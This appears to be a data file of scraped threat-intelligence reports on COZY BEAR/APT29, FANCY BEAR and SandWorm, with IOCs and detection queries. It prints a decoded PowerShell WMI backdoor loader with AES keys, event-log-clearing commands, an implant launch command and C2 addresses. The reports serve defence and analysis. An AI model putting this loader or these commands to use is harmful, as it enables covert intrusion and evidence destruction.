AJAHQAcgB5AHsADQAKAAkACQAkAHAAcgBvAHYAIAA9ACAA TgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4 AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByA GEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQB nAGUAZAANAAoACQAJACQAcAByAG8AdgAuAEsAZQB5ACAAP QAgACQAawBlAHkADQAKAAkACQAkAHAAcgBvAHYALgBJAFY AIAA9ACAAJABpAHYADQAKAAkACQAkAGQAZQBjAHIAIAA9AC AAJABwAHIAbwB2AC4AQwByAGUAYQB0AGUARABlAGMAcgB5 AHAAdABvAHIAKAAkAHAAcgBvAHYALgBLAGUAeQAsACAAJAB wAHIAbwB2AC4ASQBWACkADQAKAAkACQAkAHIAZQB0ACAA PQAgAHAAZQByAGYAQwByACAAJABkAGUAYwByACAAJABlAG 4AYwBEAGEAdABhAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwB oAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQ AKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABzAFcA UAAoACQAYwBOACwAIAAkAHAATgAsACAAJABhAEsALAAgAC QAYQBJACkADQAKAHsADQAKAAkAaQBmACgAJABjAE4AIAAt AGUAcQAgACQAbgB1AGwAbAAgAC0AbwByACAAJABwAE4AIA AtAGUAcQAgACQAbgB1AGwAbAApAHsAcgBlAHQAdQByAG4AI AAkAGYAYQBsAHMAZQB9AA0ACgAJAHQAcgB5AHsADQAKAA kACQAkAHcAcAAgAD0AIAAoAFsAdwBtAGkAYwBsAGEAcwBzA F0AJABjAE4AKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwA kAHAATgBdAC4AVgBhAGwAdQBlAA0ACgAJAAkAJABlAHgARQ BuACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAb wBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJAB3AHAA KQANAAoACQAJACQAZQB4AEQAZQBjACAAPQAgAGQAZQBjA HIAQQBlAHMAIAAkAGUAeABFAG4AIAAkAGEASwAgACQAYQBJ AA0ACgAJAAkAJABlAHgAIAA9ACAAWwBUAGUAeAB0AC4ARQ BuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUA dABTAHQAcgBpAG4AZwAoACQAZQB4AEQAZQBjACkADQAKA AkACQBpAGYAKAAkAGUAeAAgAC0AZQBxACAAJABuAHUAbAB sACAALQBvAHIAIAAkAGUAeAAgAC0AZQBxACAAJwAnACkADQ AKAAkACQB7AHIAZQB0AHUAcgBuAH0ADQAKAAkACQBJAG4 AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAG UAeAANAAoACQAJAHIAZQB0AHUAcgBuACAAJAB0AHIAdQBlA A0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsADQAKAAkACQ ByAGUAdAB1AHIAbgAgACQAZgBhAGwAcwBlAA0ACgAJAH0AD QAKAH0ADQAKAA0ACgAkAGEAZQBLACAAPQAgAFsAYgB5AH QAZQBbAF0AXQAgACgAMAB4AGUANwAsACAAMAB4AGQANg AsACAAMAB4AGIAZQAsACAAMAB4AGEAOQAsACAAMAB4AGI ANwAsACAAMAB4AGUANgAsACAAMAB4ADUANQAsACAAMAB 4ADMAYQAsACAAMAB4AGUAZQAsACAAMAB4ADEANgAsACA AMAB4ADcAOQAsACAAMAB4AGMAYQAsACAAMAB4ADUANgA sACAAMAB4ADAAZgAsACAAMAB4AGIAYwAsACAAMAB4ADMA ZgAsACAAMAB4ADIAMgAsACAAMAB4AGUAZAAsACAAMAB4A GYAZgAsACAAMAB4ADAAMgAsACAAMAB4ADQAMwAsACAAM AB4ADQAYwAsACAAMAB4ADEAYgAsACAAMAB4AGMAMAAsA CAAMAB4AGUANwAsACAAMAB4ADUANwAsACAAMAB4AGIAM gAsACAAMAB4AGMAYgAsACAAMAB4AGQAOAAsACAAMAB4A GMAZQAsACAAMAB4AGQAYQAsACAAMAB4ADAAMAApAA0AC gAkAGEAZQBJACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACg AMAB4AGIAZQAsACAAMAB4ADcAYQAsACAAMAB4ADkAMAAs ACAAMAB4AGQAOQAsACAAMAB4AGQANQAsACAAMAB4AGY ANwAsACAAMAB4AGEAYQAsACAAMAB4ADYAZAAsACAAMAB 4AGUAOQAsACAAMAB4ADEANgAsACAAMAB4ADYANAAsACAA MAB4ADEAZAAsACAAMAB4ADkANwAsACAAMAB4ADEANgAsA CAAMAB4AGMAMAAsACAAMAB4ADYANwApAA0ACgBzAFcAU AAgACcAVwBtAGkAJwAgACcAVwBtAGkAJwAgACQAYQBlAEsAI AAkAGEAZQBJACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA= This decodes to: function perfCr($crTr, $data){ $ret = $null try{ $ms = New-Object System.IO.MemoryStream $cs = New-Object System.Security.Cryptography.CryptoStream -ArgumentList @($ms, $crTr, ::Write) $cs.Write($data, 0, $data.Length) $cs.FlushFinalBlock() $ret = $ms.ToArray() $cs.Close() $ms.Close() } catch{} return $ret } function decrAes($encData, $key, $iv) { $ret = $null try{ $prov = New-Object System.Security.Cryptography.RijndaelManaged $prov.Key = $key $prov.IV = $iv $decr = $prov.CreateDecryptor($prov.Key, $prov.IV) $ret = perfCr $decr $encData } Catch{} return $ret } function sWP($cN, $pN, $aK, $aI) { if($cN -eq $null -or $pN -eq $null) {return $false} try{ $wp = ($cN).Properties<$pN>.Value $exEn = ::FromBase64String($wp) $exDec = decrAes $exEn $aK $aI $ex = ::UTF8.GetString($exDec) if($ex -eq $null -or $ex -eq '') {return} Invoke-Expression $ex return $true } catch{ return $false } } $aeK = > (0xe7, 0xd6, 0xbe, 0xa9, 0xb7, 0xe6, 0x55, 0x3a, 0xee, 0x16, 0x79, 0xca, 0x56, 0x0f, 0xbc, 0x3f, 0x22, 0xed, 0xff, 0x02, 0x43, 0x4c, 0x1b, 0xc0, 0xe7, 0x57, 0xb2, 0xcb, 0xd8, 0xce, 0xda, 0x00) $aeI = > (0xbe, 0x7a, 0x90, 0xd9, 0xd5, 0xf7, 0xaa, 0x6d, 0xe9, 0x16, 0x64, 0x1d, 0x97, 0x16, 0xc0, 0x67) sWP 'Wmi' 'Wmi' $aeK $aeI | Out-Null This one-line powershell command, stored only in WMI database, establishes an encrypted connection to C2 and downloads additional powershell modules from it, executing them in memory. In theory, the additional modules can do virtually anything on the victim system. The encryption keys in the script were different on every system. Powershell version of credential theft tool MimiKatz was also used by the actors to facilitate credential acquisition for lateral movement purposes. FANCY BEAR adversary used different tradecraft, deploying X-Agent malware with capabilities to do remote command execution, file transmission and keylogging. It was executed via rundll32 commands such as: rundll32.exe ""C:\Windows\twain_64.dll"" In addition, FANCY BEAR’s X-Tunnel network tunneling tool, which facilitates connections to NAT-ed environments, was used to also execute remote commands. Both tools were deployed via RemCOM, an open-source replacement for PsExec available from GitHub. They also engaged in a number of anti-forensic analysis measures, such as periodic event log clearing (via wevtutil cl System and wevtutil cl Security commands) and resetting timestamps of files. Intelligence collection directed by nation state actors against US political targets provides invaluable insight into the requirements directed upon those actors. Regardless of the agency or unit tasked with this collection, the upcoming US election, and the associated candidates and parties are of critical interest to both hostile and friendly nation states. The 2016 presidential election has the world’s attention, and leaders of other states are anxiously watching and planning for possible outcomes. Attacks against electoral candidates and the parties they represent are likely to continue up until the election in November. Indicators of Compromise: IOC Adv ers ary IO C T y pe Additional Info 6c1bce76f4d2358656132b6b1d 471571820688ccdbaca0d86d0 ca082b9390536 b101cd29e18a515753409ae86c e68a4cedbe0d640d385eb24b9 bbb69cf8186ae 185<.>100<.>84<.>134:443 58<.>49<.>58<.>58:443 218<.>1<.>98<.>203:80 187<.>33<.>33<.>8:80 fd39d2837b30e7233bc54598ff 51bdc2f8c418fa5b94dea2cadb2 4cf40f395e5 4845761c9bed0563d0aa83613 S H A 2 5 6 S H A 2 5 6 C 2 C 2 C 2 C 2 S H A 2 5 6 S H A CO ZY BE AR CO ZY BE AR CO ZY BE AR CO ZY BE AR CO ZY BE AR CO ZY BE AR FA NC Y BE AR FA NC pagemgr.exe (SeaDaddy implant) pagemgr.exe (SeaDaddy implant) SeaDaddy implant C2 SeaDaddy implant C2 Powershell implant C2 Powershell implant C2 twain_64.dll (64-bit X-Agent implant) VmUpgradeHel 311191e075a9b58861e80392914 Y d61a21bad976 40ae43b7d6c413becc92b0707 BE AR FA NC 6fa128b875c8dbb4da7c036639 Y eccf5a9fc784f 185<.>86<.>148<.>227:443 45<.>32<.>129<.>185:443 23<.>227<.>196<.>217:443 BE AR FA NC Y BE AR FA NC Y BE AR FA NC Y BE AR 2 5 6 S H A 2 5 6 C 2 per.exe (X- Tunnel implant) VmUpgradeHel per.exe (X- Tunnel implant) X-Agent implant C2 C 2 X-Tunnel implant C2 C 2 X-Tunnel implant C2 Interested in learning more about CrowdStrike's Falcon platform? Falcon Prevent - Next Generation AV Falcon Insight - Managed Endpoint Detection and Response Falcon Discover - Network Security Monitoring Falcon Overwatch - Threat Hunting CrowdStrike Falcon® Intelligence - Threat Intel  Tweet  Share Related Content How to Defend Employees and Data as Social Engineerin g Evolves The Anatomy of an ALPHA SPIDER Ransomwar e Attack CrowdStrik e Named a Leader with “Bold Vision” in 2024 Forrester Wave for Cybersecur ity Incident Response Services CATEGORIES AI & Machine Learning Cloud & Application Security Counter Adversary Operations Endpoint Security & XDR Engineering & Tech Executive Viewpoint Exposure Management From The Front Lines Identity Protection Next-Gen SIEM & Log Management Public Sector Small Business CONNECT WITH US       19 112 186 303 78 164 87 190 42 93 37 10 FEATURED ARTICLES October 01, 2024 CrowdStrike Named a Leader in 2024 Gartner® Magic Quadrant™ for Endpoint Protection Platforms September 25, 2024 Recognizing the Resilience of the CrowdStrike Community September 25, 2024 CrowdStrike Drives Cybersecurity Forward with New Innovations Spanning AI, Cloud, Next-Gen SIEM and Identity Protection September 18, 2024 SUBSCRIBE SUBSCRIBE SUBSCRIBE SUBSCRIBE Sign up now to receive the latest notifications and updates from CrowdStrike. Sign Up in Action See CrowdStrike Falcon in Action in Action in Action See CrowdStrike Falcon See CrowdStrike Falcon See CrowdStrike Falcon ®®®® Detect, prevent, and respond to attacks— even malware-free intrusions—at any stage, with next-generation endpoint protection. See Demo « The Wand Is Only as Good as the Magician: Getting the Most From Prevention Tools Attackers Are Targeting Cloud Service Providers » Copyright © 2024 CrowdStrike | Privacy | Request Info | Blog | Contact Us | 1.888.512.8906 | Accessibility    "
apt29,cti-hal,7ab650f491e7,G0016,"We use optional cookies to improve your experience on our websites, such as through social media connections, and to display personalized advertising based on your online activity. If you reject optional cookies, only cookies necessary to provide you the services will be used. You may change your selection by clicking “Manage Cookies” at the bottom of the page. Privacy Statement Third-Party Cookies Microsoft Security Solutions Light Dark  Blog home / Threat intelligence Products All Microsoft Search  Services Partners Resources More Accept Reject Manage cookies Research Threat intelligence Attacker techniques, tools, and infrastructure 7 min read Analysis of cyberattack on U.S. think tanks, non- profits, public sector by unidentified attackers By Microsoft Defender Security Research Team December 3, 2018 Incident response Cybercrime Cobalt Strike more  Reuters recently reported a hacking campaign focused on a wide range of targets across the globe. In the days leading to the Reuters publication, Microsoft researchers were closely tracking the same campaign. Our sensors revealed that the campaign primarily targeted public sector institutions and non-governmental organizations like think tanks and research centers, but also included educational institutions and private-sector corporations in the oil and gas, chemical, and hospitality industries. Microsoft customers using the complete Microsoft Threat Protection solution were protected from the attack. Behavior-based protections in multiple Microsoft Threat Protection components blocked malicious activities and exposed the attack at its early stages. Office 365 Advanced Threat Protection caught the malicious URLs used in emails, driving the blocking of said emails, including first-seen samples. Meanwhile, numerous alerts in Windows Defender Advanced Threat Protection exposed the attacker techniques across the attack chain. Third-party security researchers have attributed the attack to a threat actor named APT29 or CozyBear, which largely overlaps with the activity group that Microsoft calls YTTRIUM. While our fellow analysts make a compelling case, Microsoft does not yet believe that enough evidence exists to attribute this campaign to YTTRIUM. Regardless, due to the nature of the victims, and because the campaign features characteristics of previously observed nation-state attacks, Microsoft took the step of notifying thousands of individual recipients in hundreds of targeted Search the blog organizations. As part of the Defending Democracy Program, Microsoft encourages eligible organizations to participate in Microsoft AccountGuard, a service designed to help these highly targeted customers protect themselves from cybersecurity threats. Attack overview The aggressive campaign began early in the morning of Wednesday, November 14. The targeting appeared to focus on organizations that are involved with policy formulation and politics or have some influence in that area. Phishing targets in different industry verticals Although targets are distributed across the globe, majority are located in the United States, particularly in and around Washington, D.C. Other targets are in Europe, Hong Kong, India, and Canada. Phishing targets in different locations The spear-phishing emails mimicked sharing notifications from OneDrive and, as noted by Reuters, impersonated the identity of individuals working at the United States Department of State. If recipients clicked a link on the spear-phishing emails, they began an exploitation chain that resulted in the implantation of a DLL backdoor that gave the attackers remote access to the recipients’ machines. Attack chain Analysis of the campaign Delivery The spear-phishing emails used in this attack resemble file-sharing notifications from OneDrive. The emails contain a link to a legitimate, but compromised third-party website: hxxps://www.jmj.com/personal/nauerthn_state_gov/TUJE7QJl[random string] The random strings are likely used to identify distinct targeted individuals who clicked on the link. However, all observed variants of this link redirect to a specific link on the same site: hxxps://www.jmj.com/personal/nauerthn_state_gov/VFVKRTdRSm When users click the link, they are served a ZIP archive containing a malicious LNK file. All files in a given attack have the same file name, for example, ds7002.pdf, ds7002.zip, and ds7002.lnk. Installation The LNK file represents the first stage of the attack. It executes an obfuscated PowerShell command that extracts a base64-encoded payload from within the LNK file itself, starting at offset 0x5e2be and extending 16,632 bytes. Encoded content in the LNK file The encoded payload—another heavily obfuscated PowerShell script—is decoded and executed: Decoded second script The second script carves out two additional resources from within the .LNK file: ds7002.PDF (A decoy PDF) cyzfc.dat (The first stage implant) Command and control The first-stage DLL, cyzfc.dat, is created by the PowerShell script in the path %AppData%\Local\cyzfc.dat. It is a 64-bit DLL that exports one function: PointFunctionCall. The PowerShell script then executes cyzfc.dat by calling rundll32.exe. After connecting to the first-stage command-and-control server at pandorasong[.]com (95.216.59.92), cyzfc.dat begins to install the final payload by taking the following actions: 1. Allocate a ReadWrite page for the second-stage payload 2. Extract the second-stage payload as a resource 3. Take a header that is baked into the first payload with a size 0xEF bytes 4. Concatenate the header with the resource, starting at byte 0x12A. 5. De-XOR the second-stage payload with a rolling XOR (ROR1), starting from key 0xC5. The second stage is an instance of Cobalt Strike, a commercially available penetration testing tool, which performs the following steps: 1. Define a local named pipe with the format \\.\pipe\MSSE-<number>-server, where <number> is a random number between 0 and 9897 2. Connecting to the pipe, write it global data with size 0x3FE00 3. Implement a backdoor over the named pipe: 1. Read from the pipe (maximum 0x3FE00 bytes) to an allocated buffer 2. DeXOR the payload onto a new RW memory region, this time with a much simple XOR key: simple XORing every 4 bytes with 0x7CC2885F 3. Turn the region to be RX 4. Create a thread that starts running the payload’ The phase that writes to global data to the pipe actually writes a third payload. That payload is XORed with the same XORing algorithm used for reading. When decrypted, it forms a PE file with a Meterpreter header, interpreting instructions in the PE header and moving control to a reflective loader: The third payload eventually gets loaded and connects to the command-and- control (C&C) server address that is baked-in inside configuration information in the PE file. This configuration information is de-XORed at the third payload runtime: The configuration information itself mostly contains C&C information: CobaltStrike is a feature-rich penetration testing tool that provides remote attackers with a wide range of capabilities, including escalating privileges, capturing user input, executing arbitrary commands through PowerShell or WMI, performing reconnaissance, communicating with C&C servers over various protocols, and downloading and installing additional malware. End-to-end defense through Microsoft Threat Protection Microsoft Threat Protection is a comprehensive solution for enterprise networks, protecting identities, endpoints, user data, cloud apps, and infrastructure. By integrating Microsoft services, Microsoft Threat Protection facilitates signal sharing and threat remediation across services. In this attack, Office 365 Advanced Threat Protection and Windows Defender Advanced Threat Protection quickly mitigated the threat at the onset through durable behavioral protections. Office 365 ATP has enhanced phishing protection and coverage against new threats and polymorphic variants. Detonation systems in Office 365 ATP caught behavioral markers in links in the emails, allowing us to successfully block campaign emails—including first-seen samples—and protect targeted customers. Three existing behavioral-based detection algorithms quickly determined that the URLs were malicious. In addition, Office 365 ATP uses security signals from Windows Defender ATP, which had a durable behavior-based antivirus detection (Behavior:Win32/Atosev.gen!A) for the second-stage malware. If you are not already secured against advanced cyberthreat campaigns via email, begin a free Office 365 E5 trial today. Safe Links protection in Office 365 ATP protects customers from attacks like this by analyzing unknown URLs when customers try to open them. Zero-hour Auto Purge (ZAP) actively removes emails post-delivery after they have been verified as malicious—this is often critical in stopping attacks that weaponize embedded URLs after the emails are sent. All of these protections and signals on the attack entry point are shared with the rest of the Microsoft Threat Protection components. Windows Defender ATP customers would see alerts related to the detection of the malicious emails by Office 365 ATP, as well the behavior-based antivirus detection. Windows Defender ATP detects known filesystem and network artifacts associated with the attack. In addition, the actions of the LNK file are detected behaviorally. Alerts with the following titles are indicative of this attack activity: Artifacts associated with an advanced threat detected Network activity associated with an advanced threat detected Low-reputation arbitrary code executed by signed executable Suspicious LNK file opened Network protection blocks connections to malicious domains and IP addresses. The following attack surface reduction rule also blocks malicious activities related to this attack: Block executable files from running unless they meet a prevalence, age, or trusted list criteria Through Windows Defender Security Center, security operations teams could investigate these alerts and pivot to machines, users, and the new Incidents view to trace the attack end-to-end. Automated investigation and response capabilities, threat analytics, as well as advanced hunting and new custom detections, empower security operations teams to defend their networks from this attack. To test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free Windows Defender ATP trial. The following Advanced hunting query can help security operations teams search for any related activities within the network: //Query 1: Events involving the DLL container let fileHash = ""9858d5cb2a6614be3c48e33911bf9f7978b441bf""; find in (FileCreationEvents, ProcessCreationEvents, MiscEvents, RegistryEvents, NetworkCommunicationEvents, ImageLoadEvents) where SHA1 == fileHash or InitiatingProcessSHA1 == fileHash | where EventTime > ago(10d) //Query 2: C&C connection NetworkCommunicationEvents | where EventTime > ago(10d) | where RemoteUrl == ""pandorasong.com"" //Query 3: Malicious PowerShell ProcessCreationEvents | where EventTime > ago(10d) | where ProcessCommandLine contains ""-noni -ep bypass $zk=' JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5rIjtp ZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0"" //Query 4: Malicious domain in default browser commandline ProcessCreationEvents | where EventTime > ago(10d) | where ProcessCommandLine contains ""https://www.jmj.com/personal/nauerthn_state_gov"" //Query 5: Events involving the ZIP let fileHash = ""cd92f19d3ad4ec50f6d19652af010fe07dca55e1""; find in (FileCreationEvents, ProcessCreationEvents, MiscEvents, RegistryEvents, NetworkCommunicationEvents, ImageLoadEvents) where SHA1 == fileHash or InitiatingProcessSHA1 == fileHash | where EventTime > ago(10d) The provided queries check events from the past ten days. Change EventTime to focus on a different period. Windows Defender Research team, Microsoft Threat Intelligence Center, and Office 365 ATP research team Indicators of attack Files (SHA-1) ds7002.ZIP: cd92f19d3ad4ec50f6d19652af010fe07dca55e1 ds7002.LNK: e431261c63f94a174a1308defccc674dabbe3609 ds7002.PDF (decoy PDF): 8e928c550e5d44fb31ef8b6f3df2e914acd66873 cyzfc.dat (first-stage): 9858d5cb2a6614be3c48e33911bf9f7978b441bf URLs hxxps://www.jmj[.]com/personal/nauerthn_state_gov/VFVKRTdRSm C&C servers pandorasong[.]com (95.216.59.92) (first-stage C&C server) Talk to us Questions, concerns, or insights on this story? Join discussions at the Microsoft community and Windows Defender Security Intelligence. Follow us on Twitter @WDSecurity and Facebook Windows Defender Security Intelligence. Related Posts Research Threat intelligence News Cloud security News Incident response Research Threat intelligence Microsoft Defender Microsoft Defender Microsoft Defender Microsoft Defender Attacker techniques, tools, and infrastructure Dec 3, 2018 3 min read Insights from the MITRE ATT&CK- based evaluation of Windows Defender ATP  In MITRE’s evaluation of endpoint detection and response solutions, Windows Defender Advanced Threat Protection demonstrated industry-leading optics and detection capabilities. The breadth of telemetry, the strength of threat intelligence, and the advanced, automatic detection through machine learning, heuristics, and behavior monitoring delivered comprehensive coverage of attacker techniques across the entire attack chain. Nov 15, 2018 6 min read Nov 28, 2018 5 min read Windows Defender ATP device risk score exposes new cyberattack, drives Conditional access to protect networks  Several weeks ago, the Windows Defender Advanced Threat Protection (Windows Defender ATP) team uncovered a new cyberattack that targeted several high-profile organizations in the energy and food and beverage sectors in Asia. What’s new in Windows Defender ATP  We added new capabilities to each of the pillars of Windows Defender ATP’s unified endpoint protection platform: improved attack surface reduction, better- than-ever next-gen protection, more powerful post-breach detection and response, enhanced automation capabilities, more security insights, and expanded threat hunting. These enhancements boost Windows Defender ATP and accrue to the broader Microsoft Threat Protection, an integrated solution for securing identities, endpoints, cloud apps, and infrastructure. Threat actors Apr 22 10 min read Analyzing Forest Blizzard’s custom post-compromise tool for exploiting CVE- 2022-38028 to obtain credentials  Since 2019, Forest Blizzard has used a custom post- compromise tool to exploit a vulnerability in the Windows Print Spooler service that allows elevated permissions. Microsoft has issued a security update addressing this vulnerability as CVE- 2022-38028. Get started with Microsoft Security Microsoft is a leader in cybersecurity, and we embrace our responsibility to make the world a safer place. Learn more Connect with us on social What's new Microsoft Store Education Business Developer & IT Company Surface Pro Account profile Microsoft in education Microsoft Cloud Azure Careers Surface Laptop Download Center Devices for education Microsoft Security Microsoft Developer About Microsoft Surface Laptop Studio 2 Microsoft Store support Surface Laptop Go 3 Returns Microsoft Teams for Education Microsoft 365 Education Dynamics 365 Documentation Company news Microsoft 365 Microsoft Learn Privacy at Microsoft Microsoft Copilot Order tracking Microsoft Power Platform Microsoft Tech Community Investors How to buy for your school AI in Windows Certified Refurbished Microsoft Teams Azure Marketplace Diversity and inclusion Explore Microsoft products Microsoft Store Promise Windows 11 apps Flexible Payments Educator training and development Deals for students and parents Azure for students Microsoft 365 Copilot AppSource Accessibility Small Business Visual Studio Sustainability  English (United States) Your Privacy Choices Consumer Health Privacy Sitemap Contact Microsoft Privacy Manage cookies Terms of use Trademarks Safety & eco Recycling About our ads © Microsoft 2024"
sandworm,cti-hal,6d588c126069,G0034,"ReliaQuest Launches First Autonomous, Self-Learning AI Agent for Security Operations Read The Press Release  Unify Security Operations Why ReliaQuest Learn Company  Request A Demo < B A C K T O B L O G Mapping MITRE ATT&CK to SandWorm APT’s Global Campaign A B B Y T H U R M A N 2 8 O C T O B E R 2 0 2 0 RE LI AQU E S T On Thursday, October 15th, the United States Department of Justice (DoJ) indicted six Russian military oIcers connected to the SandWorm advanced persistent threat (APT) group, a threat group attributed to Russia’s Main Intelligence Directorate (GRU). The indictment alleged that the men belonged to Military Unit 77445 of the GRU and coordinated a destructive cyber campaign against thousands of US and international corporations, organizations, political campaigns, and governments. The military oIcers purportedly conspired for Russia’s strategic beneSt through unauthorized access to victim computers to support broader Russian government efforts. Abby Thurman Content Marketing Strategist Abby is a content strategist specializing in tech. She's passionate about translating diIcult concepts into clear language. When she's not working, she's exploring Utah landscapes, reading, or hanging out with her pets. Explore Blogs Throughout the years, Digital Shadows (now ReliaQuest) has followed SandWorm, and we even analyzed the impact of the indictment in our recent ShadowTalk podcast. With this new indictment and a couple of new pieces of information, we thought this would be the perfect opportunity to revisit the tactics, techniques, and procedures (TTPs) behind the SandWorm APT. A Brief Snapshot of SandWorm Threat Actors SandWorm is an APT group that has been active since at least 2009, with some researchers suggesting the group was involved in attacks against Georgia in 2008. The tactics employed in SandWorm’s campaigns align with GRU’s philosophy of leveraging aggressive and sometimes destructive cyberattacks. The charges Sled against SandWorm represent not only the Srst criminal charges against SandWorm for its most destructive attacks but the Srst time that most of the charged threat actors have been publicly identiSed as members of the cybercriminal group. They also represent SandWorm’s Srst global law enforcement reaction to their deployment of the NotPetya malware, which crippled networks worldwide. According to the Government Communications Headquarters (GCHQ), Russia is assessed as a highly competent threat actor with demonstrated potential to carry out operations that have a myriad of impacts across any industry. Russia has been carrying out disruptive cyber activities to establish itself forcefully in various ways, including seeking to disrupt other countries’ elections. For example, it has been widely reported that Russian state-associated groups were behind the “hack and leak” cyberattack, which aimed to breach French political party members’ accounts in the run-up to the 2017 French elections. The United Kingdom’s Secret Intelligence Service (SIS) reported that this activity “comes to the very muddy nexus between business and corruption and state power in Russia.” GCHQ also stated a “considerable balance of intelligence now which shows the links between serious and organized crime groups and Russian state activity.” Notable Campaigns Attributed to SandWorm _ Around December 2015 and December 2016, SandWorm attempted to destabilize Ukraine by launching cyberattacks against companies that support the country’s electric infrastructure, disrupting the supply of electricity to more than 225,000 Ukrainian customers. _ SandWorm launched spearphishing campaigns targeting local government entities, political parties, and campaigns in France, including those connected with French President Emmanuel Macron’s presidential campaign. _ Around June 2017, SandWorm launched its “NotPetya” malware campaign, causing hundreds of victim organizations worldwide to lose one billion dollars collectively. _ SandWorm retaliated against the 2018 Winter Olympics by launching cyberattacks against critical infrastructure after a Russian government-sponsored doping effort led to Russian athletes being unable to participate under the Russian hag. _ Around April 2018, SandWorm undermined efforts to hold Russia accountable for its use of a weapons-grade nerve agent on foreign soil by launching spearphishing campaigns against international and government organizations investigating the poisoning of a former GRU oIcer and his daughter. _ SandWorm defaced approximately 15,000 websites in Georgia by launching a cyberattack around October 2019. MITRE ATT&CK Mapping INITIAL ACCESS T1566: Phishing SandWorm threat group members primarily used spearphishing emails to gain access to computers or account credentials. The group speciScally crafted the emails to resemble those from trustworthy or familiar senders. Attackers went so far as to develop and test spearphishing techniques before carrying out their campaigns to increase their success chances. EXECUTION T1059: Command and Scripting Interpreter SandWorm heavily leveraged PowerShell commands and scripts to discover system information, execute code, and download malware. In one instance, the group executed a malicious PowerShell script that contained versions of a credential harvesting tool. The tool operated only in memory and was not easily detectable by antivirus software. T1204: User Execution Many of the spearphishing emails sent by SandWorm contained malware-laced documents that required user execution to deploy. PERSISTENCE T1078: Valid Accounts To maintain their foothold, SandWorm obtained and repeatedly used existing accounts’ credentials to preserve persistence in victim systems. The group primarily deployed malware and leveraged hacking tools to maintain control over victim computers and networks. PRIVILEGE ESCALATION T1078: Valid Accounts SandWorm leveraged malware to escalate system privileges and determine whether particular antivirus processors were running, then attempted to identify other computers on the same network to potentially compromise. DEFENSE EVASION T1070: Indicator Removal on Host SandWorm used an algorithm to obscure particular features of the Olympic Destroyer malware to obstruct post-attack investigations and avoid detection. The group also attempted to obfuscate their activity by deleting data from compromised machines and servers and clearing event logs. T1036: Masquerading On multiple occasions, SandWorm attempted to masquerade their activity through researching and emulating malware used by the Lazarus Group. CREDENTIAL ACCESS T1003: OS Credential Dumping SandWorm dumped credentials to obtain account login and credential details from compromised machines. T1552: Unsecured Credentials SandWorm leveraged customized malware to overwrite itself to incorporate any additional usernames and passwords that it could obtain from the previous computer before spreading to the next computer. DISCOVERY T1083: File and Directory Discovery SandWorm repeatedly accessed and browsed Sles, ran malicious scripts, and searched compromised machines for credential Sles and Sles containing network conSguration details. LATERAL MOVEMENT T1210: Exploitation of Remote Services SandWorm exploited remote services to gain unauthorized access to internal systems. Once they gained access to the remote system, they deployed malware that was leveraged to obtain system privileges, extract and execute an open-source credential harvesting tool, and move laterally throughout the network. COLLECTION T1083: File and Directory Discovery After gaining access to victims’ computers, SandWorm threat actors performed various functions designed to identify, collect, package, and view targeted data, including usernames, IP addresses, and server data relating to RDP sessions on the target computers. This activity included stealing credentials that allowed them to move laterally and exponentially throughout victims’ computer networks. COMMAND AND CONTROL T1001: Data Obfuscation SandWorm established command and control to create a single point of access between compromised networks and a server they controlled. The tunnel allowed them to hide their activity, issue commands, install additional tools, and transfer data. EXFILTRATION T1078: Valid Accounts SandWorm leveraged legitimate credentials to exSltrate data from a victim network and retrieve internal documents from machines inside victim environments. IMPACT T1491: Defacement SandWorm defaced approximately 1,500 websites and disrupted service to some of those websites following the Georgian web hosting provider’s compromise. T1490: Inhibit System Recovery The group deployed destructive malware to delete Sles from the hard drive, force shutdowns, and impede rebooting and recovery by misconSguring BitLocker, rendering computers inoperable. What Can We Expect from This? Considering the Russian Main Intelligence Directorate (GRU) allegedly sponsored SandWorm, its members’ arrest and extraction are unlikely. However, it is possible that authorities would impose sanctions against the alleged cybercriminals and the GRU unit that sponsors them, considering this countermeasure has previously been used. For now, SandWorm’s indictments will limit their ability to use the Western Snancial system or travel to any country that may have an extradition agreement with the US. Is this indictment to deter future activity from Russia state-associated threat actors? Perhaps not, but it is a step in the right direction. Generally speaking, this will remind threat actors that cyberattacks will not occur without consequences. As nation-state operations are investigated and pieced together through international cooperation, the US will likely continue to Sle indictments against associated actors to increase pressure on them. R E S O U R C E S Related Blogs R E L I A Q U E S T Report Reveals Spearphishing Constitutes 81% of Utilities Sector Alerts R E L I A Q U E S T | S E C U R I T Y O P E R A T I O N S P L A T F O R M Announcing the GreyMatter NotiWcation Center 1 M I N S 1 M I N S All Blogs See GreyMatter in Action Get a live demo of our security operations platform, GreyMatter, and learn how you can improve visibility, reduce complexity, and manage risk in your organization. Request A Demo Unify Security Operations Solution Overview Why ReliaQuest Explore the GreyMatter Platform Reduce Noise and False Positives Detection Investigation Response Automate Security Operations Dark Web Monitoring Maximize Security Investments Beyond MDR Secure Multi- Cloud Environments Secure Mergers and Acquisitions Operational Technology Threat Hunting Threat Intelligence Model Index Automated Response Playbooks Breach and Attack Simulation Digital Risk Protection Phishing Analyzer Technology Partners Learn Company Resource Center About ReliaQuest Blog Leadership Threat Research No Show Dogs Podcast Make It Possible in the Community Careers Press and Media Coverage Become a Technology Partner Contact Us Report a Vulnerability Case Studies Data Sheets eBooks Industry Guides Research Reports ShadowTalk Podcast Solution Briefs White Papers Videos Events & Webinars Contact ReliaQuest Sales (800) 925-2159 Global Corporate Headquarters 1001 Water St Suite 1900 Tampa, FL 33602 Stay Ahead of Threats Subscribe now to get updates on the latest emerging threats and industry 